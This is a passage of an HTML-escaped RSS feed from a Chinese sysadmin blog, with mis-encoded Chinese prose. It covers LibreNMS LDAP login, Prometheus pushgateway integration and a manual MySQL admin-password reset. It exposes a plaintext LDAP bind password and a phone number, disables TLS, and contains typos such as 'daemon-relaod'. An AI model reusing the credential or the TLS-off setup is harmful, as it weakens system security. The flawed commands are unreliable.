&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_starttls&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;               &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// Disable TLS on port 389&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_binddn&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;admin&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// overrides binduser&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_bindpassword&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;nishiwode&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_prefix&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;cn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_suffix&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;People&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;   &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// appended to usernames&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_groupbase&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ou&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;group&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ddky&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;com&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// all groups must be inside this&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_groups&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;admins&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;             &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// set admins group to admin level&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_groups&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pfy&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// set pfy group to global read only level&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_groups&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;support&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;level&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;            &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// set support group as a normal user&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;auth_ldap_debug&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;kc&#34;&gt;false&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;                 &lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// enable for verbose debug messages&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¯´æ˜ï¼š
æˆ‘ä»¬çš„openldapå› ä¸ºæ˜¯å†…éƒ¨ä½¿ç”¨ï¼Œæ‰€ä»¥æ— æ³•è®¾ç½®è¯ä¹¦ï¼ŒTLSæ˜¯è¢«ç¦æ­¢çš„ã€‚
openldapæ˜¯ç¦æ­¢anonymousç”¨æˆ·æŸ¥è¯¢çš„ï¼Œæ‰€ä»¥éœ€è¦è®¾ç½®binddnå’Œbindpassword
å®é™…ç”¨æˆ·æ˜¯cn=zhangranrui,ou=People,dc=ddky,dc=comï¼Œæ‰€ä»¥è¦è®¾prefix
librenmsç¼ºçœç”¨æˆ·æœ‰ä¸‰ä¸ªçº§åˆ«ï¼Œ10 5 1ï¼Œå¯¹åº”çš„ç”¨æˆ·ç»„æ˜¯admins pfy support&lt;/p&gt;</description>
    </item>
    <item>
      <title>Librenmsé›†æˆè¿›prometheus</title>
      <link>https://rendoumi.com/posts/20231213-librenms_prometheus/</link>
      <pubDate>Wed, 13 Dec 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231213-librenms_prometheus/</guid>
      <description>&lt;p&gt;librenmsæ˜¯ä¸ªéå¸¸å¼ºæ‚çš„å·¥å…·ï¼Œå¯¹ç½‘ç»œä¸æ¸…æ¥šçš„å¯ä»¥é€è¿‡è¿™ä¸ªå·¥å…·ï¼Œå¯¹ç½‘ç»œç¯å¢ƒæœ‰æ¸…æ™°çš„äº†è§£ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•é€šè¿‡prometheuså¯¹librenmsè¿›è¡Œé›†æˆå‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;ä¸€ã€è£…pushgateway&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wget https://github.com/prometheus/pushgateway/releases/download/v1.2.0/pushgateway-1.2.0.linux-amd64.tar.gz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŠŠpushgatewayæ”¾åˆ°/usr/local/bin
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat &lt;span class=&#34;s&#34;&gt;&amp;lt;&amp;lt; EOF &amp;gt;&amp;gt;/etc/systemd/system/pushgateway.service 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Unit]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Description=Codis Exporter
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Wants=network-online.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;After=network-online.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Service]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;Type=simple
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;ExecStart=/usr/local/bin/pushgateway --web.listen-address=:50004
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;[Install]
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;WantedBy=multi-user.target
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s&#34;&gt;EOF&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl daemon-relaod
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;systemctl &lt;span class=&#34;nb&#34;&gt;enable&lt;/span&gt; --now pushgateway.service
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;äºŒã€é…ç½®librenms&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; /opt/librenms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi config.php
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;prometheus&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;enable&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; true&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;prometheus&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;url&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://127.0.0.1:50004&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$config&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;prometheus&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;job&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;librenms&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# Optional&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸‰ã€é…ç½®prometheus&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- job_name: &lt;span class=&#34;s1&#34;&gt;&amp;#39;librenms&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  scrape_interval: 300s
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  honor_labels: &lt;span class=&#34;nb&#34;&gt;true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  static_configs:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    - targets: &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;172.18.31.10:50004&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      labels:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        sms_to: &lt;span class=&#34;s1&#34;&gt;&amp;#39;18618197196&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é¦–å…ˆè®¿é—®prometheusï¼Œhttp://172.18.31.8:9090/targets&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231213-librenms_prometheus/2020-07-02_152912.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ ·å¼„å¥½åï¼Œå†è®¿é—® http://172.18.31.10:50004/metrics&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20231213-librenms_prometheus/2020-07-02_152550.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‡Œé¢çš„ä¸œè¥¿æ˜¯ååˆ†ç™«ç‹‚çš„ï¼Œä»äº¤æ¢æœºç«¯å£åˆ°F5ï¼Œåº”æœ‰å°½æœ‰&lt;/p&gt;
&lt;p&gt;ä¸œè¥¿æ”¶è¿›prometheusåï¼Œå¯ä»¥é€šè¿‡grafanaå¯¹å„ç§æŒ‡æ ‡è¿›è¡Œç”»å›¾å’ŒæŠ¥è­¦&lt;/p&gt;</description>
    </item>
    <item>
      <title>Librenmså¼ºåˆ¶ä¿®æ”¹å¯†ç </title>
      <link>https://rendoumi.com/posts/20231213-librenms_password/</link>
      <pubDate>Wed, 13 Dec 2023 09:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231213-librenms_password/</guid>
      <description>&lt;p&gt;librenmså¯¹å¯†ç çš„å¼ºåº¦æœ‰è¦æ±‚ï¼Œå¿…é¡»ä½¿ç”¨éå¸¸å¤æ‚çš„å¯†ç ç­–ç•¥æ‰èƒ½æ»¡è¶³è¦æ±‚. è¿™å°±é¬¼ç•œäº†ï¼Œæƒ³æ”¹æˆè‡³å°‘èƒ½è®°å¾—ä½çš„å¯†ç ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚ä½•å¼ºåˆ¶ä¿®æ”¹å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå¼„ä¸€æ®µphpç¨‹åºæ¥ç”ŸæˆåŠ å¯†ä¸²ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
echo password_hash(&amp;quot;xxxxxxxx&amp;quot;, PASSWORD_DEFAULT);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œåå¾—åˆ°åŠ å¯†çš„å­—ç¬¦ä¸²ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆ–è€…ç›´æ¥åˆ°ä¸‹é¢çš„ç½‘ç«™æ¥ç”Ÿæˆï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://phppasswordhash.com/&#34;&gt;https://phppasswordhash.com/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åç™»å½•librenmsçš„æœºå™¨, 172.18.31.10&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;mysql -uroot -p
use librenms;
select * from users;
update users set password=&#39;$2y$10$EUvwg5kVGXQUPBw4obdPJ.AKCSVgu8ximyyoFKW7hXed0s.sh/ud6&#39; where user_id=1;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿™æ ·å°±å¼ºåˆ¶æŠŠå¯†ç ä¿®æ”¹æˆè‡ªå·±ä¹ æƒ¯çš„äº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>xxl-jobçš„åŠ¨æ€ç¼–è¾‘å¹¶æ‰§è¡Œjavaè„šæœ¬</title>
      <link>https://rendoumi.com/posts/20231212-xxl-job/</link>
      <pubDate>Tue, 12 Dec 2023 10:05:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20231212-xxl-job/</guid>
